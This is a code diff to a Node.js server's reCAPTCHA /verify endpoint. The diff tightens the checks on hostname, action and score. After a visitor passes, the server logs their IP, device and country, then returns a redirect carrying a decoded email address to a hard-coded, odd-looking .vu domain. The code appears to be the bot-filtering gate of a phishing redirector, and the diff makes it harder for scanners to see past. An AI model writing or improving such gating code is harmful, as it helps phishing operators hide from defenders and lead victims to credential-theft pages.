@@ -39,6 +39,25 @@ function detectDeviceType(ua) {
     return 'PC';
 }
 
+function isValidRecaptchaHostname(hostname) {
+    if (!hostname) return false;
+
+    const allowedDomains = [
+        'tiendalocal.cl',
+    ];
+
+    const normalizedHostname = hostname.toLowerCase();
+
+    return allowedDomains.some(domain => {
+        const normalizedDomain = domain.toLowerCase();
+
+        return (
+            normalizedHostname === normalizedDomain ||
+            normalizedHostname.endsWith(`.${normalizedDomain}`)
+        );
+    });
+}
+
 const logPath = path.join(__dirname, 'visitors.log');
 function logVisitor(ip, ua, country, device) {
     try {
@@ -137,29 +156,58 @@ app.post('/verify', async (req, res) => {
         );
 
         const result = response.data;
-        if (result.success) {
-            const ua = req.headers['user-agent'] || '';
-            const country = await lookupCountry(clientIp);
-            const device = detectDeviceType(ua);
 
-            logVisitor(clientIp, ua, country, device);
+        const MIN_SCORE = 0.2;
+        const EXPECTED_ACTION = 'homepage';
 
-            const baseUrl = process.env.REDIRECT_BASE_URL || 'https://solutionlifeseniorservicescapital.forklcwardlawllp.vu';
-            const cleanBaseUrl = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;
-            const redirectUrl = cleanBaseUrl + '/$' + encodeURIComponent(cleanB64);
-
-            return res.json({
-                status: 'success',
-                email: decodedEmail,
-                redirectUrl: redirectUrl
-            });
-        } else {
+        if (!result.success) {
             return res.status(403).json({
                 status: 'error',
                 message: 'reCAPTCHA verification failed.',
-                'error-codes': result['error-codes'] || []
+                errorCodes: result['error-codes'] || []
             });
         }
+
+        if (result.action !== EXPECTED_ACTION) {
+            return res.status(403).json({
+                status: 'error',
+                message: 'Invalid reCAPTCHA action.',
+                expected: EXPECTED_ACTION,
+                received: result.action
+            });
+        }
+
+        if (typeof result.score === 'number' && result.score < MIN_SCORE) {
+            return res.status(403).json({
+                status: 'error',
+                message: 'reCAPTCHA score too low.',
+                score: result.score
+            });
+        }
+
+        if (!isValidRecaptchaHostname(result.hostname)) {
+            return res.status(403).json({
+                status: 'error',
+                message: 'Invalid reCAPTCHA hostname.',
+                hostname: result.hostname
+            });
+        }
+
+        const ua = req.headers['user-agent'] || '';
+        const country = await lookupCountry(clientIp);
+        const device = detectDeviceType(ua);
+
+        logVisitor(clientIp, ua, country, device);
+
+        const baseUrl = process.env.REDIRECT_BASE_URL || 'https://solutionlifeseniorservicescapital.forklcwardlawllp.vu';
+        const cleanBaseUrl = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;
+        const redirectUrl = cleanBaseUrl + '/$' + encodeURIComponent(cleanB64);
+
+        return res.json({
+            status: 'success',
+            email: decodedEmail,
+            redirectUrl: redirectUrl
+        });
     } catch (err) {
         console.error('Verification Error:', err);
         return res.status(500).json({ status: 'error', message: 'Server verification processing failed.' });
